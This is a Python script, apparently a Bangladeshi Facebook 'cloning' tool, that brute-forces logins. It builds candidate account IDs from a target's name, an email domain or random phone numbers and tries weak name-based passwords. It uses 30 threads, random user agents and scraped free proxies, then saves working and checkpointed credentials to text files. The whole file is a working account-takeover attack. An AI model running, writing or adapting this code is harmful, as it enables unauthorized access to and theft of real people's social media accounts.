import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' #
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today() 
loop = 0
oks = []
cps = []
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
 prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
 open('.prox.txt','w').write(prox)
except Exception as e:
 print('')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
    aa='Mozilla/5.0(Android 6.0.1; Mobile'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Gecko/43.0 Firefox/43.0'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
uai2 = random.choice(["Mozilla/5.0 (Linux; Android 12; 220333QNY Build/SKQ1.211103.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]","Mozilla/5.0 (Linux; Android 11; CPH2021 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]","Mozilla/5.0 (Linux; Android 13; SM-S908W Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.117 Safari/537.36 [FB_IAB/FB4A;FBAV/399.0.0.24.93;]","Mozilla/5.0 (Linux; Android 12; motorola edge 30 Build/S1RDS32.55-106-3; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36[FBAN/EMA;FBLC/es_LA;FBAV/347.0.0.17.97;]","Mozilla/5.0 (Linux; Android 12; moto g32 Build/S2SN32.34-72-12; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/347.0.0.17.97;]","Mozilla/5.0 (Linux; Android 12; 21051182G Build/SKQ1.220303.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Safari/537.36[FBAN/EMA;FBLC/de_DE;FBAV/347.0.0.17.97;]","Mozilla/5.0 (Linux; Android 10; ZTE 9000 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.118 Mobile Safari/537.36[FBAN/EMA;FBLC/de_DE;FBAV/342.0.0.11.89;]","Mozilla/5.0 (Linux; Android 11; LM-Q920N Build/RKQ1.210106.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/347.0.0.17.97;]","Mozilla/5.0 (Linux; Android 12; moto g31 Build/S3RWB32.125-29-2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.79 Mobile Safari/537.36[FBAN/EMA;FBLC/es_ES;FBAV/346.0.0.8.76;]","Mozilla/5.0 (Linux; Android 11; T774H Build/RKQ1.210107.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36[FBAN/EMA;FBLC/cs_CZ;FBAV/347.0.0.17.97;]","Mozilla/5.0 (Linux; Android 11; SKY PrestigeX2 Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36[FBAN/EMA;FBLC/es_ES;FBAV/347.0.0.17.97;]","Mozilla/5.0 (Linux; Android 11; i8_ROKR Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36[FBAN/EMA;FBLC/es_LA;FBAV/347.0.0.17.97;]","Mozilla/5.0 (Linux; Android 12; RMX3521 Build/RKQ1.211119.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36[FBAN/EMA;FBLC/pl_PL;FBAV/346.0.0.8.76;]","Mozilla/5.0 (Linux; Android 12; V2203 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36[FBAN/EMA;FBLC/zh_CN;FBAV/344.0.0.10.83;]","Mozilla/5.0 (Linux; Android 11; C5L Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4577.62 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/334.0.0.17.101;]"])
logo = ("""\x1b[1;97m

 88888b.  .d8b.  d88888b .d8888.  .d8b.  d8b   db
 88  `8D d8' `8b 88'     88'  YP d8' `8b 888o  88 
 88oobY' 88ooo88 88oooo   `8bo.  88ooo88 88V8o 88
 88`8b   88°°°88 88°°°°    `Y8b. 88°°°88 88 V8o88 
 88 `88. 88   88 88      db   8D 88   88 88  V888 
 88   YD YP   YP YP      `8888Y' YP   YP VP   V8P 
\x1b[1;97m__________________________________________________
\033[38;5;196m[\033[38;5;195m√\033[38;5;196m]\x1b[1;97m AUTHOR  : RAFSAN AHAMMED RAFI
\033[38;5;196m[\033[38;5;195m√\033[38;5;196m]\x1b[1;97m FACEBOOK: MD. ARIF MIA
\033[38;5;196m[\033[38;5;195m√\033[38;5;196m]\x1b[1;97m GITHUB  : R4FSAN-143
\033[38;5;196m[\033[38;5;195m√\033[38;5;196m]\x1b[1;97m WATHAPP : 0130xxxxx54
\033[38;5;196m[\033[38;5;195m√\033[38;5;196m]\x1b[1;97m TOOLS   : MULTIPLE 
\033[38;5;196m[\033[38;5;195m√\033[38;5;196m]\x1b[1;97m Stetus  : TRAIL
\033[38;5;196m[\033[38;5;195m★\033[38;5;196m]\x1b[1;97m VIRSION : 0.4
__________________________________________________""")

class Main:
    def __init__(self):
        self.id = []
        self.ok = []
        self.cp = []
        self.loop = 0
        os.system("clear")
        os.system('xdg-open https://facebook.com/groups/3206414299669908/')
        print(logo)
        print(" [1] EMAIL CLONING")
        print(" [2] USER NAME CLONING")
        print(" [3] RANDOM CLONING[\033[1;35mBANGLADESH]")
        print("\x1b[1;97m [0] Exit")
        print("\x1b[1;97m__________________________________________________")
        Snigdho =input(" [√] Choose : ")
        if Snigdho in ["1", "01"]:
            v1()
        if Snigdho in ["2", "02"]:
            v2()
        if Snigdho in ["3","03"]:
            v3()
        if Snigdho in [" 0", "00"]:
            exit()
        else:
            exit()
def v1():
    user=[]
    os.system('clear')
    os.system('xdg-open https://facebook.com/groups/3206414299669908/')
    print(logo)
    kode = input('[√]  TARGET FAST NAME : ')
    kodex = input('[√] TARGET LAST NAME :  ')
    print(' [√] Example Doamin : @gmail.com, @yahoo.com ')
    doamin = input(' [√]  Input Doamin  : ')
    limit = int(input('[?] How many numbers do you want to add : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(1,4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(' [√]  Total ids:\033[1;92m '+tl)
        print(f"\033[1;97m [√]  Target Doamin:\033[1;92m {doamin}")
        print(' \033[1;97m[√]  The process has been started')
        print(' [√]  Wait for ids ')
        print(50*'_')
        for guru in user:
            uid = kode+kodex+guru+doamin
            pwx = [kode,kodex,kode+kodex,kode+'123',kode+'1234',kode+'12345',kode+guru,kodex+'123',kodex+'1234',kodex+'12345']
            yaari.submit(rcrack1,uid,pwx,tl)
   
    print(50*'_')
    print(' [√] Crack process has been completed')
    print(' [√] Ids saved in ok.txt,cp.txt')
    print(50*'_')
def v2():
    user=[]
    os.system('clear')
    os.system('xdg-open https://facebook.com/groups/3206414299669908/')
    print(logo)
    kode = input(' [√]  TARGET FAST NAME : ')
    kodex = input(' [√] TARGET LAST NAME :  ')
    doamin = '.'
    limit = int(input('[?] How many numbers do you want to add : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(1,4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(' [★]  Total ids:\033[1;92m '+tl)
        print(f"\033[1;97m [★]  Target Doamin:\033[1;92m Facebook CLONING (name)")
        print(' \033[1;97m[★]  The process has been started')
        print(' [★]  Wait for ids ')
        print(50*'_')
        for guru in user:
            uid = kode+doamin+kodex+guru
            pwx = [kode,kodex,kode+kodex,kode+'123',kode+'1234',kode+'12345',kode+guru,kodex+'123',kodex+'1234',kodex+'12345']
            yaari.submit(rcrack1,uid,pwx,tl)
    print(50*'_')
    print(' [√] Crack process has been completed')
    print(' [√] Ids saved in ok.txt,cp.txt')
    print(50*'_')
def v3():
    user=[]
    os.system('clear')
    os.system('xdg-open https://facebook.com/groups/3206414299669908/')
    print(logo)
    print('Example [017]  [016]   [018]   [019]')
    kode = input(' [√] Enter sim code: ')
    kodex = ''.join(random.choice(string.digits) for _ in range(2))
    kod = ''.join(random.choice(string.digits) for _ in range(2))
    doamin = ' Facebook CLONING (BD number) '
    limit = int(input('[?] How many numbers do you want to add : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
        os.system('clear')
        os.system('xdg-open https://facebook.com/groups/3206414299669908/')
        print(logo)
        tl = str(len(user))
        print(' [★] Total ids:\033[1;92m '+tl)
        print(f"\033[1;97m [★] Target Doamin:\033[1;92m {doamin}")
        print(' \033[1;97m[√] The process has been started')
        print(' [√]  Wait for ids ')
        print(50*'_')
        for guru in user:
            uid = kode+kodex+kod+guru
            pwx = [kode+kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,'bangladesh']
            yaari.submit(rcrack1,uid,pwx,tl)
    print(50*'_')
    print(' [√] Crack process has been completed')
    print(' [√] Ids saved in ok.txt,cp.txt')
    print(50*'_')
def rcrack1(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            sys.stdout.write('\r[\033[1;92mR4FSAN-XD\033[1;97m] [%s/%s] [\033[1;92mOK\033[1;97m:-\033[1;92m%s\033[1;97m] [\033[1;91mCP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
            free_fb = session.get('https://p.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'm.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    # 'cookie': 'datr=rStGZGIsghB1U49-RlxeMXF6; sb=rStGZK5DCg_kD9u3x9ZeNoTz; m_pixel_ratio=1.5; wd=1067x480; fr=0gLWjLezxpQcEHASq..BkRiut.Tm.AAA.0.0.BkRixH.AWW0ILbmFrc',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
           'user-agent': pro}
            lo = session.post('https://m.facebook.com/',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f"\033[38;5;46m[R4FSAN-OK] {uid}|{ps}")
                open('/sdcard/R4FSAN/OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[R4FSAN-CP] {uid}|{ps}")
                open('/sdcard/R4FSAN-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\033[m[R4FSAN-XD] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
Main()
